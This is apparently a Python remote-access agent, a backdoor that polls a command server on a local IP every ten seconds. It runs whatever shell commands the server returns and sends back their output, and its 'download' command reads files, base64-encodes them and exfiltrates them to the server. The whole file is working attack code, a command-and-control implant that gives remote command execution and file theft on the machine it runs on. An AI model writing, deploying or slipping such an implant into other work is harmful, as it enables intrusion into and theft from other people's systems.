#!/usr/bin/python3
import requests, subprocess, time, os, base64
data = {'mac': 'abcd'}
url = 'http://192.168.1.5:5000/store'
#response = requests.post(url, json=data)
#print(response.content)
#a=response.json()
#print(a)
#print('one')


def send(data):
    r = requests.post(url, json=data)
    #print('hi')
    return r.json()



def execute(a):
    command = a['command']
    print(a['command'])
    if command[0:2] == 'cd':
        os.chdir(command[3:])           #filenot found error if 'cd ../.. && pwd' and 'cd .....'
        command = ''
    if command[0:8] == 'download':
        path = command[9:]
        print(path)
        try:
            with open(path,"rb") as file:
                res = base64.b64encode(file.read())
                data = {'mac': 'abcd', 'token': a['token'], 'response': res}
                return data
        except FileNotFoundError:
            data = {'mac': 'abcd', 'token': a['token'], 'response': 'FileNotFoundError'}
            return data
    print(command)
    cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    currentWD = os.getcwd() + "$ "
    output_byte = cmd.stdout.read() + cmd.stderr.read() #+ currentWD
    output_str = str(output_byte,"utf-8") + currentWD
    res = output_str.strip()
    print(output_str)
    #print('hi')
    print(res)
    data = {'mac': 'abcd', 'token': a['token'], 'response': res}
    return data


while True:
    a = send(data)
    if 'token' in a:
        data = execute(a)
    time.sleep(10)
